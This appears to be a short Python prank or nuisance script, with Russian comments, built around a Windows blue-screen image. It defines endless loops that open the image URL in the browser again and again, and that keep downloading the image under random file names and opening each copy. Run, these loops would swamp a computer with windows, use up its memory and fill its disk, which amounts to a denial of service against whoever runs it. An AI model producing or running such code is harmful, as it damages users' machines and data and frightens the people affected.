import subprocess
import requests
import webbrowser
from threading import Thread
from random import choice
import os

url = 'https://upload.wikimedia.org/wikipedia/commons/3/3b/Windows_9X_BSOD.png'

def gen_name(num: int = 8):
    g = ""
    for _ in range(num):
        g += choice(list("qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"))
    return g

def browser_open():
    while True:
        webbrowser.open(url)

def img():
    while True:
        p = requests.get(url)
        name = gen_name()
        out_path = f"{name}.jpg"  # Сохраняем в текущую рабочую директорию
        with open(out_path, "wb") as out:
            out.write(p.content)

        # Определение платформы и открытие файла
        if os.name == 'posix':  # macOS или Linux
            if os.uname().sysname == 'Darwin':
                subprocess.run(["open", out_path])  # macOS
            else:
                subprocess.run(["xdg-open", out_path])  # Linux
        else:  # Windows
            subprocess.run(["start", out_path], shell=True)
